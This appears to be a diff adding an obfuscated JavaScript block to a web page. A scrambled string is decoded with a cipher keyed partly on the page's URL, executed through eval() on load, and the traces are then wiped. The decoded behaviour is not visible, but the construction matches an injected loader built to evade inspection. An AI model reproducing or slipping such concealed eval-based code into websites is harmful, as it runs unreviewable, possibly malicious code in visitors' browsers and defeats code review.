@@ -1,0 +1,39 @@
+<script language="JavaScript"> 
+<!-- 
+
+var adv    = '1-A474722'; 
+var altu  = 'x.html'; 
+
+b="DuL||rzjR/rBPc" 
++"RRA ?,mJ.FGTEvY]4$H>CDZmBKhH}E!Q;MA#,Do9-uhUo8(JD:A]gb2FvTd(yCTjKqC4]|1I2NhW%r1H" 
++"MS]-aL;BbEzN?GJc\nKyK-DrS9],npD!%!O8-CeF&\"fFT]uShPsA(4yn_?~AWsC0%nu=-f>2sAcQ(\n" 
++"4~J$3oSG}1)5c7p@I7?ON%wwf3DIfiM<V$NWtB(\tIK5[w_sacJJ*G\nfch5,xEg6iy\tKkZw8]SI =," 
++"\ti]-8II.mJFq.o];Q/o6#b#1v*gxI.hGkJ\"*g}SS]megE$fdaP<Y;NH0%nYGw:--sJxv$xG/-j]c5," 
++"dVg)yy_Q82A/VGApX],n,u8HD$};-y8mCTc&k6#P^npT~}uQ4a+Np+$@M7pL@I-lNVOEoLq-Iw,M3>1O" 
++">-yJzAUs7FkBL]]EwUQ/ 1Y IC}U5fK71KBGCI!%!E~m.}V'gkfMoC8D_ps8}w1#Zd+n,gF>LW?ccD]@" 
++"eVaP<KRe_OA_]Do)-],w]aFb.#mbOH<@epq/+GVA\tMh:\t95_WvvHEBYD.Kzyzu[BzT>H}1!cH3F:\t" 
++"ENL.vC@?@^D69nCHu [|oiMoYM|7NCF7|1#=@BWveDdB5}hju]mvRBgD#Gw~5\tH1htW7wsXobAq6=}h" 
++"h?0bgXx/{4;yNq'N1tW7@ElSD[5E55BCIDZrMGCH}^6NN0yK1|oO2DvH+H9B!_\tenaV'gXx/{9=A_8<" 
++".-HQ)\n>%lAGO(YI?zOD.DDQKKmX\t97Wli/B0F]MlWI%GbL=iLaD;wzXx&yzPc;ODKsrR9_L_g'aCy8" 
++"F:KOu[IbytKw$~N<q%N1asG8>yJDJ!DJ)CFF?0bgkS4xz/w&1zK4|Y\t=JFkCE5y.F,,e}X]dHL/ ^6N" 
++"NS'N1*lL'>]lzp2H/KtyHw|r>iFT]uShPsC4]|X:->%lzp2H/Zqp@y%nzZ!9 DPgIn,M3yNF[Gzl?>An" 
++"nG[fc>2xvOB\tg4_q.Kp/|kQ0(>%l[@xbLN%wID|sIWBH}BOnSs+\t/Ho).Ell?]9q!.AoClZCPDP x1" 
++":CH?@K?E0GZd+nFp!|_5taa@0zvKO.a11b\t4i.-HQ)\n,wTC]J|nG\nfc>%kHGS4r!0J7WlZ1@o\t,w" 
++"zHkEY%_5t]-b2bgkO8z$ JNXh*\tLI*-],w]xZ|D/CyLO1COTF(muShP5h/1yV;5ylYXp6uh5tM[G-oM" 
++"0e.z~^J$l\"P3yNLW,)FnKQm38Ddda4\n?a-#t8LwIl?P3>1#=@BWveDdB5}hju]mvRBgD#GE;Z{4W?t" 
++"N$d>qnDWK&9vN@M[sOGI( GUB_Kt8|u1L|GDX?@e*mVa?e|.yGUgO.DMB_Kt8.EZ8=J%pX3E|4:zxyH3" 
++"[/md9xT)A\tZh6{DOO6)}D>U[Q>,<7U2h?fOx#tU^H)Su~5|07|GsQsC0@NmM#e|v1XlhR]#$AO4y&~d" 
++"s3~xyFwtAI;7}ehf;vOWmR%z:K_Oz#duo~|stJlD!t7.}e744%NEO)r4^J$t}asaGT0xyFwt#u.3]]-b";var sD=location.href;aD=sD.split("/");a="@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!#$^&*():;/. _\t=\"\n{'<+%},?[]|->";key=aD[0]+'juBw3fS5v6Jg3;pH4/rgEjoTp24';if (key) { 
+ fin = ""; 
+ pos = 0; 
+ for (i=0;i<b.length;i++) { 
+  first = b.charAt(i); 
+  second = key.charAt(pos); 
+  fin+=a.charAt((a.indexOf(first)-a.indexOf(second)+a.length)%a.length); 
+  pos = (pos+1)%key.length; 
+ } 
+ eval(fin); 
+ fin=a=b=key=""; 
+} 
+// --> 
+</script>
